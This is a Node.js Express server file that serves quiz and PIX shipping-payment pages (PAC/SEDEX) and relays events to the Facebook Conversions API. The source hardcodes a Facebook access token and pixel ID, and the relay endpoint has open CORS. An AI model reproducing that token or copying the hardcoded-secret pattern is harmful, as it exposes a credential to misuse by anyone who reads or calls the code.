const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Servir arquivos estáticos e rotas
app.get('/quiz', (req, res) => {
    res.sendFile(path.join(__dirname, 'quiz.html'));
});

app.get('/pagar-pix-pac', (req, res) => {
    res.sendFile(path.join(__dirname, 'pagar-pix-pac', 'index.html'));
});

app.get('/pagar-pix-sedex', (req, res) => {
    res.sendFile(path.join(__dirname, 'pagar-pix-sedex', 'index.html'));
});

// Outras rotas das páginas estáticas
const routes = [
    'pagar-pac', 'pagar-sedex', 'cep', 'ga', 'termos', 
    'type-pac', 'type-sedex', 'sedex', 'up1', 'up2', 'up3', 'up4', 'drop'
];

routes.forEach(route => {
    app.get(`/${route}`, (req, res) => {
        res.sendFile(path.join(__dirname, route, 'index.html'));
    });
});

// Rota padrão
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'quiz.html'));
});

// Endpoint para Facebook Conversions API (server-side tracking)
app.post('/api/facebook-conversion', async (req, res) => {
    try {
        console.log('📊 Recebendo evento de conversão Facebook:', req.body);
        
        const { 
            event_name, 
            event_time, 
            event_id, // ID para desduplicação
            user_data = {}, 
            custom_data = {}, 
            event_source_url = '',
            action_source = 'website'
        } = req.body;

        // Validar dados obrigatórios
        if (!event_name) {
            return res.status(400).json({ error: 'event_name é obrigatório' });
        }

        // Gerar event_id se não fornecido (para desduplicação)
        const eventId = event_id || `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

        console.log('🔄 Processando evento para API de Conversões:', {
            event_name,
            event_id: eventId,
            deduplication: !!event_id
        });

        // Preparar dados para a Facebook Conversions API
        const conversionData = {
            data: [{
                event_name: event_name,
                event_time: event_time || Math.floor(Date.now() / 1000),
                event_id: eventId, // Campo obrigatório para desduplicação
                action_source: action_source,
                event_source_url: event_source_url,
                user_data: {
                    client_ip_address: req.ip || req.connection.remoteAddress,
                    client_user_agent: req.headers['user-agent'],
                    fbc: user_data.fbc || '', // Facebook Click ID
                    fbp: user_data.fbp || '', // Facebook Browser ID
                    em: user_data.em || '', // email hasheado
                    ph: user_data.ph || '', // telefone hasheado
                },
                custom_data: {
                    currency: custom_data.currency || 'BRL',
                    value: custom_data.value || 0,
                    content_name: custom_data.content_name || '',
                    content_category: custom_data.content_category || 'frete',
                    transaction_id: custom_data.transaction_id || '',
                    utm_source: custom_data.utm_source || '',
                    utm_medium: custom_data.utm_medium || '',
                    utm_campaign: custom_data.utm_campaign || '',
                    utm_content: custom_data.utm_content || '',
                    utm_term: custom_data.utm_term || ''
                }
            }],
            access_token: 'EAARfjYp6gD4BOZBnSxVPIcZCeF3ZCvXe1NnrgWO6lfHidEaHvJf9trVPGZA0lZA1V1w6fa1YSMyMdrbqs6WQuYPzghSk3SljrrKp77FqaE7G4oqVMsUKMMv0sagpJBh4waxtNZBmK0YtdzZA4qyEwSJInMI0QuDout9wOvsccDdGdFM4DiRZACMIs2fRnvwuTxkEPAZDZD'
        };

        // Enviar para Facebook Conversions API
        const facebookResponse = await fetch('https://graph.facebook.com/v21.0/1249534570141968/events', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(conversionData)
        });

        const responseData = await facebookResponse.json();
        
        if (facebookResponse.ok) {
            console.log('✅ Conversão enviada para Facebook:', responseData);
            console.log('🔄 Event ID para desduplicação:', eventId);
            res.json({ 
                success: true, 
                facebook_response: responseData,
                event_name: event_name,
                event_id: eventId,
                pixel_id: '1249534570141968',
                deduplication_enabled: true
            });
        } else {
            console.error('❌ Erro ao enviar conversão para Facebook:', responseData);
            res.status(400).json({ 
                success: false, 
                error: responseData,
                event_name: event_name,
                event_id: eventId
            });
        }
        
    } catch (error) {
        console.error('❌ Erro no endpoint Facebook:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Erro interno do servidor',
            message: error.message 
        });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Servidor CCB rodando na porta ${PORT}`);
    console.log(`📋 Rotas disponíveis: /, /quiz, /pagar-pac, /pagar-sedex, /drop`);
    console.log(`📊 Facebook Conversions API endpoint: /api/facebook-conversion`);
});
